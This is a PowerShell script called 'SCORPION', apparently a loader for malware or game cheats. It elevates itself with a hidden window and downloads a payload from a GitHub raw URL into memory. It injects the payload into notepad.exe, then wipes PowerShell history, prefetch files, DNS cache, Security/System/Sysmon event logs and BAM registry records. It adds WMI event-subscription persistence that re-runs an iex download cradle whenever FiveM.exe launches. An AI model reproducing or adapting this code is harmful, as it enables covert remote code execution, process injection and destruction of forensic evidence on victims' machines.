# SCORPION â€” in-memory runtime. Nothing is written to disk by this script.
# Generated into a one-liner by make_link.ps1. Do not run this file directly.
$ErrorActionPreference = 'Stop'

$PayloadUrl    = 'https://raw.githubusercontent.com/TomMaat/z-01/main/payload.bin'
$LaunchCommand = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/TomMaat/z-01/main/Scorpion.ps1''))"'
$HostPath      = 'C:\Windows\System32\notepad.exe'

$NS        = 'root\subscription'
$Filter    = 'SystemHealthCheck'
$Consumer  = 'SystemHealthMonitor'
$RunValue  = 'SysMainCache'

# -- elevation ---------------------------------------------------------------
$wp = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    if ($LaunchCommand -notlike '__*') {
        Start-Process -FilePath powershell -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-Command',$LaunchCommand) -Verb RunAs
    }
    return
}

# -- native loader (reflected from memory, no temp files) --------------------
$NativeB64 = ''
$asm = [Reflection.Assembly]::Load([Convert]::FromBase64String($NativeB64))
$nativeType = $asm.GetType('ScorpionNative')
$inject = $nativeType.GetMethod('Inject', [Reflection.BindingFlags]'Public,Static')

# -- fetch payload into memory (never saved to disk) -------------------------
$wc = New-Object System.Net.WebClient
$payload = $wc.DownloadData($PayloadUrl)
if ($null -eq $payload -or $payload.Length -lt 100000) { throw 'payload download failed' }

$ok = $inject.Invoke($null, @($payload, $HostPath))

[Array]::Clear($payload, 0, $payload.Length)
$payload = $null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()

# -- artifact cleanup --------------------------------------------------------
function Clear-Artifacts {
    $hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
    Remove-Item $hist -Force -ErrorAction SilentlyContinue

    Get-ChildItem "$env:SystemRoot\Prefetch\*.pf" -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^(POWERSHELL|NOTEPAD)' } |
        ForEach-Object {
            try {
                $f = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Write, [IO.FileShare]::None)
                $f.SetLength(0); $f.Close()
            } catch {}
        }

    try { Clear-DnsClientCache -ErrorAction Stop } catch {}
    foreach ($log in @('Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational',
                       'Microsoft-Windows-Sysmon/Operational', 'Security', 'System')) {
        try { Clear-EventLog -LogName $log -ErrorAction Stop } catch {}
    }
    try {
        Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings' -ErrorAction SilentlyContinue |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
}
Clear-Artifacts

# -- WMI-only persistence (no script file anywhere) --------------------------
function Install-Persistence {
    if ($LaunchCommand -like '__*') { return }
    $f = Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{
        Name = $Filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'FiveM.exe'"
    } -ErrorAction Stop
    $c = Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{
        Name = $Consumer; CommandLineTemplate = $LaunchCommand
    } -ErrorAction Stop
    $null = Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{
        Filter = $f; Consumer = $c
    } -ErrorAction Stop
}

if ($ok) { Install-Persistence }

$NativeB64 = $null
$asm = $null
$nativeType = $null
$LaunchCommand = $null
$PayloadUrl = $null

